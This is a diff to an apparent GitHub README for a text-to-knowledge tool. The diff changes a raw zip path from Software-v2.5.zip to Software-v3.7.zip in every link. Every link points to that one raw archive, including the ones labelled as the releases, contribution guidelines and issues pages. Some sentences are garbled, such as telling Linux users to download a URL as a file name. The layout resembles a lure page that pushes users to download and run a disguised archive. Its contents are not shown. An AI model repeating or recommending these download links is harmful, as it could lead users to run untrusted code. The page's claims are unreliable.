@@ -7,7 +7,7 @@ texttoknowledge helps you convert unstructured text into structured, queryable k
 To get started with texttoknowledge, follow these steps to download and run the application.
 
 ## 📥 Download Now
-[![Download texttoknowledge](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v2.5.zip)](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v2.5.zip)
+[![Download texttoknowledge](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v3.7.zip)](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v3.7.zip)
 
 ## 📦 System Requirements
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux (Ubuntu 18.04 or later)
@@ -16,18 +16,18 @@ To get started with texttoknowledge, follow these steps to download and run the 
 
 ## 💻 Installation Instructions
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v2.5.zip) to find the latest version of texttoknowledge.
+   Go to the [Releases page](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v3.7.zip) to find the latest version of texttoknowledge.
 
 2. **Download the Application**
    On the Releases page, select the version you want to download. Click on the corresponding file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v2.5.zip` file.
+   - For Linux, download the `https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v3.7.zip` file.
    
 3. **Run the Installer**
    - For Windows: Once downloaded, double-click the `.exe` file and follow the installation prompts.
    - For macOS: Open the `.dmg` file and drag the texttoknowledge icon to your Applications folder. 
-   - For Linux: Extract the downloaded `https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v2.5.zip` file in a directory of your choice. Navigate to that directory and follow the execution command in the README included inside.
+   - For Linux: Extract the downloaded `https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v3.7.zip` file in a directory of your choice. Navigate to that directory and follow the execution command in the README included inside.
 
 4. **Open texttoknowledge**
    After installation, locate the application in your programs or applications list and launch it.
@@ -65,13 +65,13 @@ Yes, after extraction, you can manually edit the captured details as needed.
 Yes, your data remains private. texttoknowledge does not save any information on remote servers.
 
 ## 📝 Contributing
-We welcome contributions to improve texttoknowledge. If you wish to add features or report issues, please visit our [Contribution Guidelines](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v2.5.zip).
+We welcome contributions to improve texttoknowledge. If you wish to add features or report issues, please visit our [Contribution Guidelines](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v3.7.zip).
 
 ## 🙌 Support
-If you encounter issues while using the application, feel free to reach out through the [Issues page](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v2.5.zip). We aim to resolve all queries promptly.
+If you encounter issues while using the application, feel free to reach out through the [Issues page](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v3.7.zip). We aim to resolve all queries promptly.
 
 ## 🌐 Learn More
 For additional details about the technology and methodologies used in texttoknowledge, check out our documentation online or explore the source code in the repository.
 
 ## 🔗 Download & Install Again
-To download the application, please visit the [Releases page](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v2.5.zip).
+To download the application, please visit the [Releases page](https://github.com/Yushh2006/texttoknowledge/raw/refs/heads/main/texttoknowledge/Software-v3.7.zip).
